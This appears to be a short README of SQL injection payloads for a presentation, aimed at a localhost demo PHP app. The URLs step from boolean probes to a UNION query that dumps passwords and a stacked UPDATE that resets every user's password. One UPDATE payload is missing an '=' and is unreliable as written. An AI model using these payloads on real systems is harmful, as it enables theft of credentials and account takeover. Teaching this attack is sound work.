sql-injection-examples
======================

Few examples of sql injection for an upcoming presentation on the topic.

# Normal access
http://localhost/sql-injection-example/basic.php?id=1

# If this works, the app may be vulnerable
http://localhost/sql-injection-example/basic.php?id=3 AND 1=1

# Can I print more users then?
http://localhost/sql-injection-example/basic.php?id=2 OR id=3

# Can I get them all?
http://localhost/sql-injection-example/basic.php?id=2 OR id is not null

# Uhm... so can I get their password? --> you need to know that the table is called user
http://localhost/sql-injection-example/basic.php?id=2 union select password from user;

# Or maybe I can choose what their password should be? d8578edf8458ce06fbc5bb76a58c5ca4 being the md5("qwerty")
http://localhost/sql-injection-example/basic.php?id=2; UPDATE user SET password 'd8578edf8458ce06fbc5bb76a58c5ca4';--

# Updating of password
http://localhost/sql-injection-example/chg_pwd.php?id=2 OR 1=1&pwd="d8578edf8458ce06fbc5bb76a58c5ca4"





